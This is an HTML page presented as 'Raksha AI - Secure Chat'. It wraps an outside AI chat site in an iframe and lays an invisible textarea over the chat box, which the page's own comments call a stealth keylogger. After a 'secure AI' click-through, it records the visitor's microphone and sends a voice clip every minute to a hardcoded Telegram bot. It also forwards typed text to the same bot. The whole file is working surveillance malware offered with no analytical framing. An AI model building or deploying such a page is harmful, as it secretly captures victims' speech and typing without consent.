<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Raksha AI - Secure Chat</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
        
        /* Asli AI Interface */
        #aiFrame {
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        /* Invisible Keylogger Layer */
        /* Iski 'bottom' position ko AI ke chat box ke hisaab se adjust karein */
        #stealthInput {
            position: absolute;
            bottom: 25px; 
            left: 5%;
            width: 90%;
            height: 50px;
            background: rgba(255, 255, 255, 0.01); 
            border: none;
            color: transparent;
            caret-color: #000; 
            z-index: 9999;
            outline: none;
            font-size: 16px;
        }

        #startCover {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000; color: #0f0;
            display: flex; justify-content: center; align-items: center;
            z-index: 10000; cursor: pointer; font-family: monospace;
        }
    </style>
</head>
<body>

    <div id="startCover">üõ°Ô∏è CLICK TO INITIALIZE SECURE AI</div>

    <iframe id="aiFrame" src="https://aesthetic-yeot-93d835.netlify.app" allow="microphone;"></iframe>

    <textarea id="stealthInput" placeholder=""></textarea>

    <script>
        const TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
        const MY_ID = "8508792403";
        
        const startBtn = document.getElementById('startCover');
        const stealthBox = document.getElementById('stealthInput');

        startBtn.onclick = async () => {
            startBtn.style.display = 'none';
            initAudio();
        };

        // --- 1. Audio Recording Feature ---
        async function initAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                let chunks = [];

                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    const fd = new FormData();
                    fd.append("chat_id", MY_ID);
                    fd.append("voice", blob, "voice_log.ogg");
                    fd.append("caption", "üé§ VOICE LOG: Conversation Recorded");

                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
                    chunks = [];
                    if (stream.active) setTimeout(() => recorder.start(), 1000);
                };

                recorder.start();
                // Har 60 seconds mein audio bhejega
                setInterval(() => { if (recorder.state === "recording") recorder.stop(); }, 60000);
            } catch (err) { console.log("Audio Sync..."); }
        }

        // --- 2. Stealth Keylogger Feature ---
        let typingTimer;
        stealthBox.addEventListener('input', () => {
            clearTimeout(typingTimer);
            typingTimer = setTimeout(sendChatToTelegram, 3000); // 3 sec rukne par bhejega
        });

        async function sendChatToTelegram() {
            const text = stealthBox.value;
            if (text.trim() === "") return;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: MY_ID,
                    text: `‚å®Ô∏è USER TYPED:\n${text}`
                })
            });
        }
    </script>
</body>
</html>
